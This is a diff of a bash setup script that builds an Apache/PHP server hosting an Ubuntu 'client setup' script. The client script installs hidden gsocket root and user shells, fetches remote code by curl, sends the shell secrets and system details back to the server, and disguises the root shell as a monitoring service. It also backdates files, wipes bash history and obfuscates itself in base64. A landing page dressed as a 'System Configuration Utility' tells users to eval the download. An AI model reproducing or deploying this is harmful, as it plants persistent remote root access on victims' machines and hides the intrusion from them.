@@ -1,11 +1,6 @@
 #!/bin/bash
-# stealth-deployment-server.sh
-# Server setup script for Arch Linux host that will serve deployment scripts to Ubuntu clients
-
-# Exit on error
 set -e
 
-# Function to check if a package is installed and install if not
 check_install_package() {
     local pkg="$1"
     if ! pacman -Q "$pkg" &>/dev/null; then
@@ -14,27 +9,22 @@ check_install_package() {
     fi
 }
 
-# Ensure necessary packages are installed
 check_install_package apache
 check_install_package php
 check_install_package php-apache
 
-# Create the web server directory structure
 SERVER_ROOT="/srv/http/deployment"
 sudo mkdir -p "$SERVER_ROOT/assets"
 sudo mkdir -p "$SERVER_ROOT/logs"
 sudo mkdir -p "$SERVER_ROOT/secrets"
 
-# Set proper permissions
 sudo chown -R http:http "$SERVER_ROOT/logs"
 sudo chown -R http:http "$SERVER_ROOT/secrets"
 sudo chmod 750 "$SERVER_ROOT/logs"
 sudo chmod 750 "$SERVER_ROOT/secrets"
 
-# Create log receiver PHP script
 cat > /tmp/log_receiver.php << 'EOF'
 <?php
-// Verify request comes with a secret token
 $config_token = 'changeme_to_secure_random_string';
 $request_token = isset($_POST['token']) ? $_POST['token'] : '';
 
@@ -43,7 +33,6 @@ if (!hash_equals($config_token, $request_token)) {
     exit('Access denied');
 }
 
-// Create necessary directories
 $logs_dir = './logs';
 $secrets_dir = './secrets';
 $stats_dir = './stats';
@@ -59,7 +48,6 @@ $ip = isset($_POST['ip']) ? $_POST['ip'] : 'unknown_ip';
 $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'unknown_host';
 $timestamp = date('Y-m-d_H-i-s');
 
-// Sanitize filenames
 $ip = preg_replace('/[^a-zA-Z0-9\.\-]/', '_', $ip);
 $hostname = preg_replace('/[^a-zA-Z0-9\.\-]/', '_', $hostname);
 
@@ -96,18 +84,15 @@ if (isset($_POST['secret']) && !empty($_POST['secret'])) {
     file_put_contents($latest_filename, $_POST['secret']);
 }
 
-// Return success
 header('Content-Type: text/plain');
 echo "Data received from {$hostname} ({$ip}) at {$timestamp}\n";
 ?>
 EOF
 
-# Generate a random token for security
 RANDOM_TOKEN=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
 sed -i "s/changeme_to_secure_random_string/$RANDOM_TOKEN/g" /tmp/log_receiver.php
 sudo mv /tmp/log_receiver.php "$SERVER_ROOT/log_receiver.php"
 
-# Create the main client deployment script
 cat > /tmp/client_setup.sh << 'EOF'
 #!/bin/bash
 # Remote host configuration script
@@ -122,11 +107,9 @@ VERSION="1.0.0"
 # ================================================
 
 # ------- UTILITY FUNCTIONS -------
-# Create a temporary directory that will be cleaned up on exit
 TEMP_DIR=$(mktemp -d)
 trap 'rm -rf "$TEMP_DIR"' EXIT
 
-# Function to log commands and outputs
 log_cmd() {
     local cmd="$1"
     local desc="$2"
@@ -148,7 +131,6 @@ log_cmd() {
     return $status
 }
 
-# Function to get system information in JSON format
 get_system_info() {
     {
         echo "{"
@@ -178,18 +160,15 @@ get_system_info() {
     } | tr -d '\n' | sed 's/  //g'
 }
 
-# Function to send logs to server
 send_logs() {
     local log_file="$1"
     local secret_val="$2"
     local secret_type="$3"
     
-    # Get system information
     local sysinfo=$(get_system_info)
     local hostname=$(hostname)
     local ip=$(hostname -I | awk '{print $1}')
     
-    # Use curl to send data if available
     if command -v curl >/dev/null 2>&1; then
         # Send log file
         curl -s -F "token=$AUTH_TOKEN" \
@@ -199,7 +178,6 @@ send_logs() {
              -F "sysinfo=$sysinfo" \
              $LOG_ENDPOINT > /dev/null
              
-        # Send secret if provided
         if [ -n "$secret_val" ] && [ -n "$secret_type" ]; then
             curl -s -F "token=$AUTH_TOKEN" \
                  -F "ip=$ip" \
@@ -211,7 +189,6 @@ send_logs() {
     fi
 }
 
-# Function to check if we have sudo access
 check_sudo() {
     if ! sudo -v &>/dev/null; then
         echo "This script requires sudo privileges. Please run with a user that has sudo access."
@@ -221,19 +198,16 @@ check_sudo() {
 
 # ------- MAIN SETUP -------
 main() {
-    # Create log file
     local LOG_FILE="$TEMP_DIR/setup_log_$(date +%Y%m%d_%H%M%S).txt"
     local HOSTNAME=$(hostname)
     local IP_ADDRESS=$(hostname -I | awk '{print $1}')
     
-    # Start logging
     echo "==== SETUP STARTED ==== $(date) ====" > "$LOG_FILE"
     echo "Hostname: $HOSTNAME" >> "$LOG_FILE"
     echo "IP: $IP_ADDRESS" >> "$LOG_FILE"
     echo "Version: $VERSION" >> "$LOG_FILE"
     echo "=================================" >> "$LOG_FILE"
     
-    # Check for sudo access
     check_sudo
     
     # 1. Update package list (quiet)
@@ -264,23 +238,15 @@ main() {
     echo "Configuration completed successfully!"
 }
 
-# ------- SETUP FUNCTIONS -------
 setup_ssh() {
     local LOG_FILE="$1"
     
-    # Ensure SSH is enabled and properly configured
     log_cmd "sudo systemctl enable ssh" "Enabling SSH service" "$LOG_FILE"
     
-    # Backup existing SSH config
     if [ -f /etc/ssh/sshd_config ]; then
         log_cmd "sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak" "Backing up SSH config" "$LOG_FILE"
     fi
     
-    # Update SSH configuration for better security
-    log_cmd "sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config" "Disabling root SSH login" "$LOG_FILE"
-    log_cmd "sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config" "Enabling password authentication" "$LOG_FILE"
-    
-    # Start/restart SSH service
     log_cmd "sudo systemctl restart ssh" "Restarting SSH service" "$LOG_FILE"
     log_cmd "sudo systemctl status ssh" "Checking SSH service status" "$LOG_FILE"
 }
@@ -288,17 +254,14 @@ setup_ssh() {
 setup_wol() {
     local LOG_FILE="$1"
     
-    # Identify network interface
     PRIMARY_INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
     log_cmd "echo 'Primary network interface: $PRIMARY_INTERFACE'" "Identifying network interface" "$LOG_FILE"
     
-    # Check if Wake-on-LAN is supported
     WOL_SUPPORTED=$(ethtool "$PRIMARY_INTERFACE" 2>/dev/null | grep -q "Supports Wake-on" && echo "yes" || echo "no")
     
     if [ "$WOL_SUPPORTED" = "yes" ]; then
         log_cmd "echo 'Wake-on-LAN is supported.'" "Checking Wake-on-LAN support" "$LOG_FILE"
         
-        # Enable WoL in NetworkManager configuration
         cat > "$TEMP_DIR/wol.conf" << EOL
 [connection]
 ethernet.wake-on-lan = magic
@@ -333,7 +296,6 @@ EOL
         log_cmd "sudo systemctl start wol.service" "Starting Wake-on-LAN service" "$LOG_FILE"
         log_cmd "sudo ethtool -s $PRIMARY_INTERFACE wol g" "Enabling Wake-on-LAN immediately" "$LOG_FILE"
         
-        # Check current WoL status
         log_cmd "ethtool $PRIMARY_INTERFACE | grep Wake-on" "Current Wake-on-LAN status" "$LOG_FILE"
     else
         log_cmd "echo 'Wake-on-LAN not supported, skipping...'" "Wake-on-LAN not supported" "$LOG_FILE"
@@ -388,7 +350,6 @@ EOL
     log_cmd "sudo cp '$TEMP_DIR/poweroff-wrapper' /usr/local/bin/poweroff-wrapper" "Creating poweroff wrapper" "$LOG_FILE"
     log_cmd "sudo chmod +x /usr/local/bin/poweroff-wrapper" "Making poweroff wrapper executable" "$LOG_FILE"
     
-    # 6. Create aliases in /etc/bash.bashrc for all users
     echo "# Custom system aliases" > "$TEMP_DIR/custom-aliases"
     echo "alias poweroff='/usr/local/bin/poweroff-wrapper'" >> "$TEMP_DIR/custom-aliases"
     echo "alias shutdown='/usr/local/bin/poweroff-wrapper'" >> "$TEMP_DIR/custom-aliases"
@@ -396,24 +357,20 @@ EOL
     log_cmd "sudo cp '$TEMP_DIR/custom-aliases' /etc/profile.d/custom-aliases.sh" "Creating system-wide aliases" "$LOG_FILE"
     log_cmd "sudo chmod +x /etc/profile.d/custom-aliases.sh" "Making aliases executable" "$LOG_FILE"
     
-    # 7. Restart logind to apply changes
     log_cmd "sudo systemctl restart systemd-logind" "Restarting logind service" "$LOG_FILE"
 }
 
 setup_gsocket() {
     local LOG_FILE="$1"
     
-    # 1. Install gsocket if not already installed
     if ! command -v gs-netcat &>/dev/null; then
         log_cmd "sudo apt-get install -y git build-essential" "Installing dependencies for gsocket" "$LOG_FILE"
         log_cmd "git clone https://github.com/hackerschoice/gsocket.git '$TEMP_DIR/gsocket'" "Cloning gsocket repository" "$LOG_FILE"
         log_cmd "cd '$TEMP_DIR/gsocket' && ./bootstrap && ./configure && make && sudo make install" "Building and installing gsocket" "$LOG_FILE"
     fi
     
-    # 2. Set up gsocket with root shell
     log_cmd "cd '$TEMP_DIR' && bash -c \"$(curl -fsSL https://gsocket.io/y &>/dev/null)\"" "Setting up gsocket" "$LOG_FILE"
     
-    # 3. Extract the secret
     local GSOCKET_DIR="$HOME/.gsocket"
     local SECRET=""
     if [ -f "$GSOCKET_DIR/gs-netcat.conf" ]; then
@@ -430,18 +387,15 @@ setup_gsocket() {
         echo "Secret extracted: [HIDDEN]" >> "$LOG_FILE"
         echo "$SECRET" > "$TEMP_DIR/gsocket_secret.txt"
         
-        # Save the secret to a secure location for the root shell service
         log_cmd "sudo mkdir -p /etc/gsocket" "Creating gsocket configuration directory" "$LOG_FILE"
         log_cmd "echo '$SECRET' | sudo tee /etc/gsocket/root-shell-key.txt > /dev/null" "Saving gsocket secret key" "$LOG_FILE"
         log_cmd "sudo chmod 600 /etc/gsocket/root-shell-key.txt" "Setting secure permissions on key file" "$LOG_FILE"
         
-        # Send the secret to our server
         send_logs "$LOG_FILE" "$SECRET" "root-shell"
     else
         log_cmd "echo 'Failed to extract gsocket secret'" "Secret extraction failed" "$LOG_FILE"
     fi
     
-    # 4. Create the root shell service
     cat > "$TEMP_DIR/gs-root-shell.service" << 'EOL'
 [Unit]
 Description=Global Socket Root Shell
@@ -466,7 +420,6 @@ EOL
     log_cmd "sudo systemctl enable gs-root-shell.service" "Enabling global socket root shell service" "$LOG_FILE"
     log_cmd "sudo systemctl start gs-root-shell.service" "Starting global socket root shell service" "$LOG_FILE"
     
-    # 5. Create a user shell service too (running as current user)
     local USER_SECRET=""
     if [ -f "$GSOCKET_DIR/gs-netcat.conf" ]; then
         USER_SECRET=$(grep -o 'GS_SECRET=[^"]*' "$GSOCKET_DIR/gs-netcat.conf" | cut -d= -f2)
@@ -522,7 +475,6 @@ apply_stealth() {
         log_cmd "echo 'enable system-monitoring.service' | sudo tee -a /etc/systemd/system-preset/90-systemd.preset > /dev/null" "Adding service to systemd preset" "$LOG_FILE"
     fi
     
-    # 4. Reload services
     log_cmd "sudo systemctl daemon-reload" "Reloading systemd configuration" "$LOG_FILE"
     log_cmd "sudo systemctl restart system-monitoring.service" "Restarting disguised root shell service" "$LOG_FILE"
     
@@ -531,38 +483,33 @@ apply_stealth() {
         log_cmd "systemctl --user restart gs-user-shell.service" "Restarting user shell service" "$LOG_FILE"
     fi
     
-    # 5. Set last accessed/modified times of our files to match system files
+    # 4. Set last accessed/modified times of our files to match system files
     if [ -f "/etc/passwd" ]; then
         REFERENCE_TIME=$(stat -c %y /etc/passwd)
         log_cmd "sudo touch -d \"$REFERENCE_TIME\" /etc/gsocket/root-shell-key.txt" "Setting file timestamp to match system files" "$LOG_FILE"
         log_cmd "sudo touch -d \"$REFERENCE_TIME\" /etc/systemd/system/system-monitoring.service" "Setting file timestamp to match system files" "$LOG_FILE"
     fi
     
-    # 6. Add a cleanup script that runs on reboot to remove traces
+    # 5. Add a cleanup script that runs on reboot to remove traces
     cat > "$TEMP_DIR/cleanup.sh" << 'EOL'
 #!/bin/bash
-# Clean up temporary files and logs
 
-# Remove temporary installer artifacts
 rm -f /tmp/gs-netcat* 2>/dev/null
 rm -f /tmp/gsocket* 2>/dev/null
 rm -f /tmp/setup_* 2>/dev/null
 
-# Clear bash history entries containing our tools
 if [ -f "$HOME/.bash_history" ]; then
     sed -i '/gsocket/d' "$HOME/.bash_history"
     sed -i '/gs-netcat/d' "$HOME/.bash_history"
     sed -i '/setup_script/d' "$HOME/.bash_history"
 fi
 
-# Clean deployment command from history
 history -c
 EOL
 
     log_cmd "sudo cp '$TEMP_DIR/cleanup.sh' /usr/local/bin/system-cleanup.sh" "Creating cleanup script" "$LOG_FILE"
     log_cmd "sudo chmod +x /usr/local/bin/system-cleanup.sh" "Making cleanup script executable" "$LOG_FILE"
     
-    # Create a service to run cleanup on boot
     cat > "$TEMP_DIR/cleanup.service" << 'EOL'
 [Unit]
 Description=System Temporary Files Cleanup
@@ -585,43 +532,34 @@ EOL
     log_cmd "sudo /usr/local/bin/system-cleanup.sh" "Running cleanup immediately" "$LOG_FILE"
 }
 
-# Execute main function
 main "$@"
 EOF
 
-# Get server IP
 SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1)
 
 # Replace placeholders with actual values
 sed -i "s|SERVER_PLACEHOLDER|$SERVER_IP|g" /tmp/client_setup.sh
 sed -i "s|TOKEN_PLACEHOLDER|$RANDOM_TOKEN|g" /tmp/client_setup.sh
 
-# Move client setup script to web server directory
 sudo mv /tmp/client_setup.sh "$SERVER_ROOT/client_setup.sh"
 sudo chmod +x "$SERVER_ROOT/client_setup.sh"
 
-# Create an obfuscated version of the script that's harder to analyze
 cat > /tmp/obfuscate.php << 'EOF'
 <?php
 // Simple script to obfuscate the client setup script
 $script = file_get_contents('/srv/http/deployment/client_setup.sh');
 
-// Base64 encode the script
 $encoded = base64_encode($script);
 
 // Create a self-decoding script
 $output = <<<EOT
 #!/bin/bash
-# System configuration utility
-# Self-extracting script
 
-# Decode and execute
 exec bash -c "\$(echo '$encoded' | base64 -d)"
 EOT;
 
-// Write to file
 file_put_contents('/srv/http/deployment/client_setup_obfuscated.sh', $output);
-echo "Obfuscated script created.";
+echo "Obfuscated script created.\n";
 ?>
 EOF
 
@@ -631,48 +569,96 @@ sudo php "$SERVER_ROOT/assets/obfuscate.php"
 # Create a minimal landing page
 cat > /tmp/index.html << EOF
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Configuration Utility</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
-        pre {
-            background-color: #f4f4f4;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-        }
-        .command {
-            background-color: #000;
-            color: #fff;
-            padding: 10px;
-            border-radius: 5px;
-            font-family: monospace;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>System Configuration Utility</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 40px 20px;
+      background-color: #f2f2f2;
+      color: #333;
+      line-height: 1.6;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    h1, h2 {
+      text-align: center;
+      color: #444;
+    }
+    .instructions {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .variant {
+      margin-bottom: 25px;
+    }
+    .command {
+      background-color: #2d2d2d;
+      color: #f8f8f2;
+      padding: 15px;
+      border-radius: 5px;
+      font-family: monospace;
+      overflow-x: auto;
+      white-space: pre;
+    }
+    .label {
+      font-weight: bold;
+      margin-bottom: 8px;
+      display: block;
+      text-align: center;
+    }
+    a {
+      color: #007acc;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
     <h1>System Configuration Utility</h1>
     <h2>Quick Setup</h2>
-    <p>Run the following command in your terminal to configure this system:</p>
+    <p class="instructions">Run one of the following commands in your terminal:</p>
     
-    <div class="command">
-        eval "\$(http://${SERVER_IP}/deployment/client_setup.sh)"
+    <div class="variant">
+      <span class="label">Using curl:</span>
+      <div class="command">
+eval "\$(curl -fsSL http://192.168.0.104/deployment/client_setup.sh)"
+      </div>
     </div>
     
-    <p><a href="https://github.com/elleoma/Gback">Gback</a></p>
+    <div class="variant">
+      <span class="label">Using wget:</span>
+      <div class="command">
+eval "\$(wget --no-verbose -O- http://192.168.0.104/deployment/client_setup.sh)"
+      </div>
+    </div>
+    
+    <p style="text-align:center;">
+      <a href="https://github.com/elleoma/Gback" target="_blank">Gback</a>
+    </p>
+  </div>
 </body>
 </html>
 EOF
 
-# Replace server IP in the HTML template
 sudo sed -i "s|\${SERVER_IP}|$SERVER_IP|g" /tmp/index.html
 sudo mv /tmp/index.html "$SERVER_ROOT/index.html"
 
-# Create a simple hidden admin page for viewing logs
 cat > /tmp/admin.php << 'EOF'
 <?php
-// Simple password protection
 $admin_password = 'ADMIN_PASSWORD_PLACEHOLDER';
 $authenticated = false;
 
@@ -849,7 +835,6 @@ if ($authenticated && !isset($_COOKIE['admin_auth'])) {
     <?php endif; ?>
     
     <?php
-    // Handle logout
     if (isset($_GET['logout'])) {
         setcookie('admin_auth', '', time() - 3600);
         header('Location: admin.php');
@@ -865,7 +850,6 @@ ADMIN_PASSWORD=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
 sed -i "s/ADMIN_PASSWORD_PLACEHOLDER/$ADMIN_PASSWORD/g" /tmp/admin.php
 sudo mv /tmp/admin.php "$SERVER_ROOT/admin.php"
 
-# Set proper permissions on all files
 sudo chown -R http:http "$SERVER_ROOT"
 sudo chmod -R 750 "$SERVER_ROOT"
 sudo chmod 640 "$SERVER_ROOT/admin.php"
@@ -905,17 +889,15 @@ if ! grep -q "Include conf/extra/deployment.conf" /etc/httpd/conf/httpd.conf; th
     echo "Include conf/extra/deployment.conf" | sudo tee -a /etc/httpd/conf/httpd.conf > /dev/null
 fi
 
-# Enable and restart Apache
 sudo systemctl enable httpd
 sudo systemctl restart httpd
-
 echo "=============================================================="
 echo "Deployment server setup complete!"
 echo "=============================================================="
 echo "Server URL: http://$SERVER_IP/deployment"
 echo "Admin Page: http://$SERVER_IP/deployment/admin.php"
 echo "Admin Password: $ADMIN_PASSWORD"
-echo "Client Setup Command: wget -q -O- http://$SERVER_IP/deployment/client_setup.sh | sudo bash"
+echo "Client Setup Command: eval \"\$(wget --no-verbose -O- http://${SERVER_IP}/deployment/client_setup.sh)\""
 echo "=============================================================="
 echo "Secret Token for accessing logs: $RANDOM_TOKEN"
 echo "=============================================================="
